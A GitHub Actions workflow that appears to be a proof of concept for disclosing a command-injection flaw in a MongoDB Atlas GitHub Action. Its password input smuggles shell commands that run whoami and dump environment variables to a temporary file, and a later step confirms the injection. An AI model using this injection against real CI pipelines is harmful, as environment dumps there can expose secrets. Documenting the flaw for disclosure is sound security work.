name: POC - Command Injection via password in setup

on:
  workflow_dispatch:
  push:
    branches:
      - main

jobs:
  exploit:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: POC - Command Injection via password
        uses: mongodb/atlas-github-action@v0.2.0
        continue-on-error: true
        with:
          run-setup: true
          username: "testuser"
          # Command injection via password parameter
          # The password is inserted into FLAGS without quoting, allowing injection
          # Using --help makes the command succeed, then our injected commands execute
          password: "--help; echo 'üö® INJECTION via password üö®' > /tmp/password-injection-poc.txt && echo 'User:' $(whoami) && echo 'PWD:' $(pwd) && echo 'Date:' $(date) >> /tmp/password-injection-poc.txt && echo 'Env vars accessible!' && env | head -10 >> /tmp/password-injection-poc.txt || true #"
          tier: "M0"
          provider: "AWS"
          region: "US_EAST_1"

      - name: Verify Injection
        shell: bash
        run: |
          if [ -f /tmp/password-injection-poc.txt ]; then
            echo "‚úÖ VULNERABILITY CONFIRMED: Command injection via password successful!"
            echo ""
            echo "The password parameter is used in FLAGS without proper quoting."
            echo "This is particularly dangerous as passwords are often user-controlled."
            echo "The injected command executed, proving the vulnerability."
          else
            echo "‚ùå Injection may have failed"
          fi
